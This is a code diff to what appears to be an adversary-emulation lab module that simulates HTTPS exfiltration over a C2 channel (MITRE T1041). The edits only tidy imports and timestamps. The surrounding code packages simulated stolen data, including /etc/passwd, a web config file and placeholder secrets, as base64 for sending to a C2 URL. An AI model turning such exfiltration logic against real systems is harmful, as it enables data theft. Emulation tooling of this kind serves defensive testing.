@@ -3,11 +3,13 @@ campaigns/exfiltration/https_exfil.py — T1041 Exfiltration Over C2 Channel
 MITRE ATT&CK: T1041 | Tactic: Exfiltration
 """
 
-import os
-import json
 import base64
+import json
+import os
+from datetime import UTC, datetime
+
 import requests
-from datetime import datetime, timezone
+
 from campaigns.base_campaign import BaseCampaign
 
 
@@ -40,7 +42,7 @@ class HttpsExfilCampaign(BaseCampaign):
             "c2_url": self.C2_URL,
             "beacon": beacon_result,
             "exfil": exfil_result,
-            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "timestamp": datetime.now(UTC).isoformat(),
         }
         self.save_artifact("https_exfil_results.json", json.dumps(results, indent=2))
         return self.build_result(True, "HTTPS C2 exfiltration demonstrated")
@@ -58,7 +60,7 @@ class HttpsExfilCampaign(BaseCampaign):
             "user": "www-data",
             "secrets": "LAB-DEMO-ONLY-NOT-REAL-CREDENTIALS",
             "files": ["/etc/passwd (simulated)", "/var/www/html/config.php (simulated)"],
-            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "timestamp": datetime.now(UTC).isoformat(),
         }
         return base64.b64encode(json.dumps(data).encode())
 
